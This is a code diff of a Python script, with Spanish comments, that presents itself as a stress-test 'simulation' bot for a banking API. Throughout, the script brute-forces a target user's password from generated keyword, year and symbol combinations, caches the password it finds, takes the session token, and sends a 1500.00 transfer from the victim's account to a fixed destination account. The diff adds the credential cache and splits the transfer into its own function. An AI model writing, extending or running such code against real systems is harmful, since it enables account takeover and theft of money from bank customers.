@@ -3,6 +3,7 @@ Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
 -------------------------------------------------------------------------
 Descripción: Realiza pruebas de autenticación heurística y ejecuta 
              transferencias simuladas directamente contra los endpoints de FastAPI.
+VERSIÓN:  1.1
 """
 
 import requests
@@ -31,6 +32,8 @@ HEADERS = {
 # ==========================================
 # DICCIONARIO Y PATRONES HEURÍSTICOS
 # ==========================================
+KNOWN_CREDENTIALS = {}
+
 CONTEXT_KEYWORDS = ["Banco", "Secure"]
 YEARS = ["2024", "2026"]
 SYMBOLS = ["$", "#"]
@@ -55,71 +58,62 @@ def generate_passwords():
     return list(generated)
 
 def run_api_bot():
-    """
-    Flujo principal de simulación del bot:
-    1. Evalúa el listado de contraseñas contra el endpoint de inicio de sesión.
-    2. Extrae el token de autorización y la cuenta de origen del response exitoso.
-    3. Construye el payload de transacción con la estructura validada por el esquema Pydantic.
-    4. Ejecuta la petición POST de transferencia y reporta la respuesta del backend.
-    """
+    print(f"🤖 [BOT API] Iniciando verificación para usuario: {TARGET_USER}")
+
+    # 1. Verificar si la contraseña ya fue descubierta previamente
+    if TARGET_USER in KNOWN_CREDENTIALS:
+        valid_password = KNOWN_CREDENTIALS[TARGET_USER]
+        print(f"⚡ [CACHÉ LOG] Contraseña conocida encontrada en memoria: '{valid_password}'")
+        print("⏩ Saltando ejecución del algoritmo heurístico de fuerza bruta.\n")
+        execute_login_and_transfer(TARGET_USER, valid_password)
+        return
+    
+    #2. Si no se conoce, ejecutar algoritmo heuristico
+    print("🔍 Contraseña no registrada. Ejecutando algoritmo de prueba heurística...\n")
     candidates = generate_passwords()
-    print(f"🤖 [BOT API] Iniciando simulación contra {API_BASE}...\n")
 
     for attempt, pwd in enumerate(candidates, 1):
-        # Cuerpo de la petición para autenticación
-        login_payload = {
-            "username": TARGET_USER,
-            "password": pwd
-        }
-
+        login_payload = {"username": TARGET_USER, "password": pwd}
         try:
-            # Envío de la petición de inicio de sesión
             response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)
-
-            # HTTP 200 OK: Autenticación exitosa
             if response.status_code == 200:
-                login_data = response.json()
-                print(f"✅ [Intento {attempt}] ¡Acceso concedido! Contraseña: '{pwd}'")
-
-                # Preparar cabeceras con token de autorización si la API lo requiere
-                headers_tx = HEADERS.copy()
-                token = login_data.get("token") or login_data.get("access_token")
-                if token:
-                    headers_tx["Authorization"] = f"Bearer {token}"
-
-                # Extraer id de cuenta retornado en la respuesta o usar identificador predeterminado
-                source_account = login_data.get("account_id", "MX-4821-0001")
-
-                # Estructura requerida por el backend para procesar la transacción
-                transfer_payload = {
-                    "account_id": source_account,
-                    "destination_account": "MX-9012-3344",
-                    "amount": 1500.00
-                }
-
-                print(f"💸 Ejecutando transferencia: {transfer_payload}")
-                tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
-
-                # Diagnóstico de respuesta de la transacción
-                print(f"\n📊 Respuesta Transferencia: HTTP {tx_resp.status_code}")
-                try:
-                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.json()}")
-                except Exception:
-                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.text}")
-                    
-                return  # Finalizar la ejecución tras completar el flujo con éxito
-
+                print(f"✅ [Intento {attempt}] ¡Contraseña identificada!: '{pwd}'")
+                
+                # Guardar en el diccionario para futuras ejecuciones
+                KNOWN_CREDENTIALS[TARGET_USER] = pwd
+                print(f"💾 Credencial guardada en el diccionario de credenciales conocidas.")
+                
+                execute_login_and_transfer(TARGET_USER, pwd, response.json())
+                return
             else:
-                # HTTP 401 Unauthorized u otros códigos de rechazo
-                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> Probado: '{pwd}'")
-
+                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> '{pwd}'")
         except Exception as e:
             print(f"⚠️ Error de conexión en intento {attempt}: {e}")
 
-        # Latencia deliberada entre intentos para controlar la frecuencia de peticiones
         time.sleep(0.4)
 
     print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")
+
+def execute_login_and_transfer(username, password, login_data=None):
+    if not login_data:
+        resp = requests.post(LOGIN_URL, json={"username": username, "password": password}, headers=HEADERS)
+        login_data = resp.json()
+
+    headers_tx = HEADERS.copy()
+    token = login_data.get("token") or login_data.get("access_token")
+    if token:
+        headers_tx["Authorization"] = f"Bearer {token}"
+
+    source_account = login_data.get("account_id", "MX-4821-0001")
+    transfer_payload = {
+        "account_id": source_account,
+        "destination_account": "MX-9012-3344",
+        "amount": 1500.00
+    }
+
+    print(f"💸 Ejecutando transferencia con sesión validada: {transfer_payload}")
+    tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
+    print(f"📊 Respuesta Transferencia: HTTP {tx_resp.status_code}")
 
 if __name__ == "__main__":
     run_api_bot()
